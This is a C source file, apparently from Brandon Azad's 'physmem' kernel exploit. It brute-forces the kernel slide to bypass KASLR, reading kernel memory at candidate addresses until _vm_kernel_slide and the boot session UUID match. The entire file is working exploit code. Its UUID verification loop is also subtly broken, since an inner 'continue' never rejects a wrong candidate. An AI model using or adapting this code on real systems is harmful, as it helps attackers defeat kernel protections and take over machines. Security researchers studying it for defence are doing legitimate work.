/*
 * kernel_slide.c
 * Brandon Azad
 *
 * Find the kernel slide using the physmem exploit.
 *
 * We use physmem's kernel read primitive to test each possible kernel slide until we find the
 * right one. Technically, all of the reads before we find the right kernel slide are to arbitrary
 * locations, and any of them could trigger a panic. However, in my (quite extensive) testing, I've
 * never once had a panic triggered this way.
 */
#include "kernel_slide.h"

#include "fail.h"
#include "kernel_image.h"
#include "physmem.h"

#include <errno.h>
#include <string.h>
#include <sys/sysctl.h>

uint64_t kernel_slide;

/*
 * kern_bootsessionuuid
 *
 * Description:
 * 	The name of the sysctl node we use to check that the kernel slide is correct.
 */
static const char *kern_bootsessionuuid = "kern.bootsessionuuid";

void probe_kernel_slide() {
	const uint64_t increment = 0x200000;
	const uint64_t max_slide = (increment / 2) * 0x400;
	// Find the address of vm_kernel_slide and bootsessionuuid_string in the base kernel.
	uint64_t _vm_kernel_slide = kernel_symbol("_vm_kernel_slide");
	uint64_t _bootsessionuuid_string = kernel_symbol("_bootsessionuuid_string");
	// Read the memory we will use to check kernel slide correctness.
	char uuid[37];
	size_t size = sizeof(uuid);
	int err = sysctlbyname(kern_bootsessionuuid, uuid, &size, NULL, 0);
	if (err != 0) {
		FAIL("sysctlbyname(%s) failed: %s", kern_bootsessionuuid, strerror(errno));
	}
	// Try all the different kernel slides.
	for (kernel_slide = increment; kernel_slide < max_slide; kernel_slide += increment) {
		uint64_t value = kern_read(_vm_kernel_slide + kernel_slide, sizeof(value));
		if (value != kernel_slide) {
			continue;
		}
		const unsigned n = sizeof(uuid) / sizeof(uint64_t);
		uint64_t base = _bootsessionuuid_string + kernel_slide;
		for (unsigned i = 0; i < n; i++) {
			value = kern_read(base + i * sizeof(uint64_t), sizeof(value));
			if (value != ((uint64_t *)uuid)[i]) {
				continue;
			}
		}
		return;
	}
	FAIL("could not find kernel slide");
}
